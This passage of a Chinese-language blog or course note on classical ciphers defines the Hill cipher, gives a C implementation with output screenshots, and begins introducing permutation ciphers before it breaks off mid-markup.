class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>。</li>
</ul>
<h3 id="密码体制-5"><a class="markdownIt-Anchor" href="#密码体制-5"></a> 密码体制</h3>
<ul>
<li>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>≥</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">m\geq2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>为正整数，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>Z</mi><mn>26</mn></msub><msup><mo stretchy="false">)</mo><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">P=C=(Z_{26})^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">K=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>{定义在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">m\times m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>可逆矩阵}，对任意的密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>，定义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mi>K</mi></mrow><annotation encoding="application/x-tex">e_k(x)=xK</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi><msup><mi>K</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">d_k(y)=yK^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>。以上运算都是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上进行的。</li>
</ul>
<h3 id="代码实现-5"><a class="markdownIt-Anchor" href="#代码实现-5"></a> 代码实现</h3>
<ul>
<li>
<p>函数代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> MAX=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> K1[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, K2[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> Temp1[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, Temp2[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> text[MAX] = &#123;<span class="number">0</span>&#125;,result[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> T1[MAX] = &#123;<span class="number">0</span>&#125;, T2[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len, flag=<span class="number">0</span>, temp, temp1, i, j, num=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请填写明文或者密文:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择加密方式，输入1加密，输入2解密:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥k（以空格分开的数组）:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">2</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;K1[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">/**加密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将大写转成小写，并赋值给T1数组</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T1[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到加密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp1[<span class="number">0</span>] = T1[i];</span><br><span class="line">            Temp1[<span class="number">1</span>] = T1[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp2存储密文int值</span></span><br><span class="line">            Temp2[<span class="number">0</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">0</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp2[<span class="number">1</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">1</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T2[i] = Temp2[<span class="number">0</span>];</span><br><span class="line">            T2[i + <span class="number">1</span>] = Temp2[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T2[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;明文%s的密文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">/**解密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T2[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 求K的逆</span></span><br><span class="line">        temp = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; temp &lt; <span class="number">0</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = (K1[<span class="number">0</span>][<span class="number">0</span>] * K1[<span class="number">1</span>][<span class="number">1</span>] - K1[<span class="number">0</span>][<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span> * i;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((temp * i) % <span class="number">26</span> == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp1 = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">0</span>] = K1[<span class="number">1</span>][<span class="number">1</span>] * temp1;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">1</span>] = (((<span class="number">-1</span> * K1[<span class="number">0</span>][<span class="number">1</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">0</span>] = (((<span class="number">-1</span> * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">1</span>] = K1[<span class="number">0</span>][<span class="number">0</span>] * temp1;</span><br><span class="line">        <span class="comment">// 得到解密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp2[<span class="number">0</span>] = T2[i];</span><br><span class="line">            Temp2[<span class="number">1</span>] = T2[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp1存储明文int值</span></span><br><span class="line">            Temp1[<span class="number">0</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">0</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp1[<span class="number">1</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">1</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T1[i] = Temp1[<span class="number">0</span>];</span><br><span class="line">            T1[i + <span class="number">1</span>] = Temp1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T1[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;密文%s的明文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213734.png" alt="alt 希尔密码加密" /></p>
</li>
<li>
<p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213816.png" alt="alt 希尔密码解密" /></p>
</li>
</ul>
<h2 id="置换密码"><a class="markdownIt-Anchor" href="#置换密码"></a> 置换密码</h2>
<h3 id="介绍-6"><a class="markdownIt-Anchor" href="#介绍-6"></a> 介绍</h3>
<ul>
<li>代换密码：明文字母被不同的密文字母所代替。</li>
<li>置换密码：保持明文字母不变，利用置换打乱了明文字母的位置和次序。</li>
<li>定义在有限集<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>上的一个置换是一个双射函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi><mo>:</mo><mi>X</mi><mo>→</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">\pi :X\rightarrow X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>。即对于任意的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mtext> </mtext><mi>X</mi></mrow><annotation encoding="application/x-tex">x\in\ X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace"> </span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>，存在唯一的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mo>∈</mo><mtext>  </mtext><mi>X</mi></mrow><annotation encoding="application/x-tex">x^{&#x27;}\in \;X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.98158em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><msup><mi>x</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\pi(x^{&#x27;})=x\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.19248em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>。则逆置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>:</mo><mi>X</mi><mo>→</mo><mi>X</mi><mo>:</mo><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\pi^{-1}:X\rightarrow X:\pi^{-1}(x)=x^{&#x27;}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>当且仅当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>π</mi><mo stretchy="false">(</mo><msup><mi>x</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">\;\pi(x^{&#x27;})=x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 